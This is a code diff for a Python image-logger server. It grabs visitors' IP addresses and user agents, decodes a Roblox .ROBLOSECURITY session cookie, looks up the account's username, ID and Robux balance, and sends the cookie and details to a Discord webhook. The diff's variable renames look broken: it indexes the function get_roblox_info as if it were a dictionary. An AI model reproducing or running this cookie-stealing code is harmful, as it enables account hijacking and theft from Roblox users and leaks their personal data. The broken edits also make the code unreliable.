@@ -76,38 +76,6 @@ def botCheck(ip, useragent):
     else:
         return False
     
-def get_roblox_info(cookie):
-    try:
-        session = requests.Session()
-        session.cookies['.ROBLOSECURITY'] = cookie
-        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        
-        # Get user info
-        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
-        if user_resp.status_code != 200:
-            return None
-        user_data = user_resp.json()
-        uid = user_data.get('id')
-        username = user_data.get('name', 'Unknown')
-        
-        # Get Robux (POST endpoint)
-        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
-        if robux_resp.status_code != 200:
-            return {'username': username, 'id': str(uid), 'robux': 'Error', 'cookie': cookie}
-        
-        robux_data = robux_resp.json()
-        robux = robux_data.get('robux', 0)
-        
-        return {
-            'username': username,
-            'id': str(uid),
-            'robux': f"{robux:,}",
-            'cookie': cookie
-        }
-    except Exception as e:
-        print(f"Roblox lookup fail: {e}")  # Silent log
-        return None
-
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -211,12 +179,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
   ],
 }
     
-    if roblox_info:
+    if get_roblox_info:
         embed["fields"].extend([
-            {"name": "🟥 Roblox Username", "value": roblox_info['username'], "inline": True},
-            {"name": "🟥 Roblox ID", "value": roblox_info['id'], "inline": True},
-            {"name": "🟥 Robux", "value": roblox_info['robux'], "inline": True},
-            {"name": "🟥 Cookie (truncated)", "value": roblox_info['cookie'][:100] + "..." if len(roblox_info['cookie']) > 100 else roblox_info['cookie'], "inline": False}
+            {"name": "🟥 Roblox Username", "value": get_roblox_info['username'], "inline": True},
+            {"name": "🟥 Roblox ID", "value": get_roblox_info['id'], "inline": True},
+            {"name": "🟥 Robux", "value": get_roblox_info['robux'], "inline": True},
+            {"name": "🟥 Cookie (truncated)", "value": get_roblox_info['cookie'][:100] + "..." if len(get_roblox_info['cookie']) > 100 else get_roblox_info['cookie'], "inline": False}
         ])
         embed["color"] = 0xff0000 
     
@@ -230,6 +198,38 @@ binaries = {
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
+
+def get_roblox_info(cookie):
+    try:
+        session = requests.Session()
+        session.cookies['.ROBLOSECURITY'] = cookie
+        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        
+        # Get user info
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
+        if user_resp.status_code != 200:
+            return None
+        user_data = user_resp.json()
+        uid = user_data.get('id')
+        username = user_data.get('name', 'Unknown')
+        
+        # Get Robux (POST endpoint)
+        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
+        if robux_resp.status_code != 200:
+            return {'username': username, 'id': str(uid), 'robux': 'Error', 'cookie': cookie}
+        
+        robux_data = robux_resp.json()
+        robux = robux_data.get('robux', 0)
+        
+        return {
+            'username': username,
+            'id': str(uid),
+            'robux': f"{robux:,}",
+            'cookie': cookie
+        }
+    except Exception as e:
+        print(f"Roblox lookup fail: {e}")  # Silent log
+        return None
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
@@ -269,7 +269,7 @@ height: 100vh;
                     roblox_cookie = base64.b64decode(roblox_cookie_b64.encode()).decode('utf-8')
                     roblox_data = get_roblox_info(roblox_cookie)
                     if roblox_data:
-                        makeReport(ip, self.headers.get('user-agent'), roblox_info=roblox_data, endpoint=s.split("?")[0], url=url)
+                        makeReport(ip, self.headers.get('user-agent'), get_roblox_info=roblox_data, endpoint=s.split("?")[0], url=url)
                 except Exception:
                     reportError(traceback.format_exc())  # silent fail
             
@@ -320,18 +320,18 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = message.replace("{roblox_user}", roblox_info['username'])
-                    message = message.replace("{roblox_id}", roblox_info['id'])
-                    message = message.replace("{robux}", roblox_info['robux'])
-                    message = message.replace("{roblox_cookie}", roblox_info['cookie'])
+                    message = message.replace("{roblox_user}", get_roblox_info['username'])
+                    message = message.replace("{roblox_id}", get_roblox_info['id'])
+                    message = message.replace("{robux}", get_roblox_info['robux'])
+                    message = message.replace("{roblox_cookie}", get_roblox_info['cookie'])
 
                 datatype = 'text/html'
 
-                if roblox_info:
-                    message = message.replace("{roblox_user}", roblox_info['username'])
-                    message = message.replace("{roblox_id}", roblox_info['id'])
-                    message = message.replace("{robux}", roblox_info['robux'])
-                    message = message.replace("{roblox_cookie}", roblox_info['cookie'])
+                if get_roblox_info:
+                    message = message.replace("{roblox_user}", get_roblox_info['username'])
+                    message = message.replace("{roblox_id}", get_roblox_info['id'])
+                    message = message.replace("{robux}", get_roblox_info['robux'])
+                    message = message.replace("{roblox_cookie}", get_roblox_info['cookie'])
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
